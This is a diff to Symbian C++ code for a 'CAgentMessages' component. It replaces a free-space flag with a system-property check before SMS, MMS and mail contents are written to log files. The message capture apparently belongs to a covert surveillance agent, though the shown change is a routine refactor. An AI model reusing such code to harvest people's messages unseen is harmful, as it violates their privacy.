@@ -298,29 +298,6 @@ void CAgentMessages::StopAgentCmdL()
 	//CloseLogL();    // TODO: verify this              
 	}
 
-void CAgentMessages::NotifyAgentCmdL(TUint32 aData)
-	{
-	TInt notifyType = aData & 0x000000ff;
-	switch(notifyType)
-		{
-		case ENotifyThreshold:
-			{
-			TInt value = (aData & 0x0000ff00) >> 8;
-			if (value == EBelow)
-				{
-				iBelowFreespaceQuota = ETrue;
-				}
-			else
-				{
-				iBelowFreespaceQuota = EFalse;
-				}
-			}
-			break;
-		default:
-			break;
-		}
-	}
-
 
 
 HBufC8* CAgentMessages::GetSMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId)
@@ -947,7 +924,9 @@ void CAgentMessages::DoOneRoundL()
 				buf.CleanupClosePushL();
 				if (buf.Length() > 0)
 				{
-					if(!iBelowFreespaceQuota)
+					TInt value;
+					RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+					if(value)
 						{
 						CLogFile* logFile = CLogFile::NewLC(iFs);
 						logFile->CreateLogL(LOGTYPE_SMS);
@@ -968,7 +947,9 @@ void CAgentMessages::DoOneRoundL()
 				buf.CleanupClosePushL();
 				if (buf.Length() > 0)
 				{
-					if(!iBelowFreespaceQuota)
+					TInt value;
+					RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+					if(value)
 						{
 						CLogFile* logFile = CLogFile::NewLC(iFs);
 						logFile->CreateLogL(LOGTYPE_MMS);
@@ -989,7 +970,9 @@ void CAgentMessages::DoOneRoundL()
 				buf.CleanupClosePushL();
 				if (buf.Length() > 0)
 				{
-					if(!iBelowFreespaceQuota)
+					TInt value;
+					RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+					if(value)
 						{
 						CLogFile* logFile = CLogFile::NewLC(iFs);
 						//logFile->CreateLogL(LOGTYPE_MAIL);
@@ -1087,7 +1070,10 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 						buf.CleanupClosePushL();
 						if (buf.Length() > 0)
 						{
-							if(!iBelowFreespaceQuota)
+							TInt value;
+							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+												
+							if(value)
 								{
 								CLogFile* logFile = CLogFile::NewLC(iFs);
 								logFile->CreateLogL(LOGTYPE_SMS);
@@ -1109,7 +1095,10 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 							buf.CleanupClosePushL();
 							if (buf.Length() > 0)
 							{
-								if(!iBelowFreespaceQuota)
+								TInt value;
+								RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+													
+								if(value)
 									{
 									CLogFile* logFile = CLogFile::NewLC(iFs);
 									logFile->CreateLogL(LOGTYPE_MMS);
@@ -1131,7 +1120,9 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 							buf.CleanupClosePushL();
 							if (buf.Length() > 0)
 							{
-								if(!iBelowFreespaceQuota)
+								TInt value;
+								RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+								if(value)
 									{
 									CLogFile* logFile = CLogFile::NewLC(iFs);
 									logFile->CreateLogL(LOGTYPE_MAIL);
@@ -1186,7 +1177,9 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 						buf.CleanupClosePushL();
 						if (buf.Length() > 0)
 						{
-							if(!iBelowFreespaceQuota)
+							TInt value;
+							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+							if(value)
 								{
 								CLogFile* logFile = CLogFile::NewLC(iFs);
 								logFile->CreateLogL(LOGTYPE_SMS);
@@ -1208,7 +1201,9 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 						buf.CleanupClosePushL();
 						if (buf.Length() > 0)
 						{
-							if(!iBelowFreespaceQuota)
+							TInt value;
+							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+							if(value)
 								{
 								CLogFile* logFile = CLogFile::NewLC(iFs);
 								logFile->CreateLogL(LOGTYPE_MMS);
@@ -1230,7 +1225,9 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 						buf.CleanupClosePushL();
 						if (buf.Length() > 0)
 						{
-							if(!iBelowFreespaceQuota)
+							TInt value;
+							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+							if(value)
 								{
 								CLogFile* logFile = CLogFile::NewLC(iFs);
 								logFile->CreateLogL(LOGTYPE_MAIL);
